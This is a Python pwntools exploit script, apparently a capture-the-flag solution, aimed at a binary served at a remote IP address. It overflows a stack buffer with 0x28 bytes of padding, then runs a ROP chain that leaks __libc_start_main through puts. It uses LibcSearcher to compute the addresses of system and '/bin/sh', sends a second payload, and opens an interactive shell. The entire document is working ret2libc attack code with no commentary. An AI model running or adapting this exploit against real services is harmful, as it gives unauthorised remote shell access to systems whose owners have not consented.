from pwn import *
from LibcSearcher import LibcSearcher
#p=process('./pwn')
p=remote('222.186.56.247',8123)
elf=ELF('./pwn')

vuln=p64(elf.symbols['vuln'])
puts=p64(elf.plt['puts'])
libc_main=p64(elf.got['__libc_start_main'])
pop_rdi_ret=p64(0x400733)

payload1='a'*0x28+pop_rdi_ret+libc_main+puts+vuln

p.recvuntil('story!\n')
p.sendline(payload1)
libc_start_main_addr=u64(p.recvuntil('\n',drop=True).ljust(8,"\x00"))
log.success('[*]__libc_start_main:'+hex(libc_start_main_addr))
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
log.success('[*]system:'+hex(system_addr))
log.success('[*]binsh:'+hex(binsh_addr))

payload2='a'*0x28+pop_rdi_ret+p64(binsh_addr)+p64(system_addr)
p.recvuntil('story!\n')
p.sendline(payload2)
p.interactive()
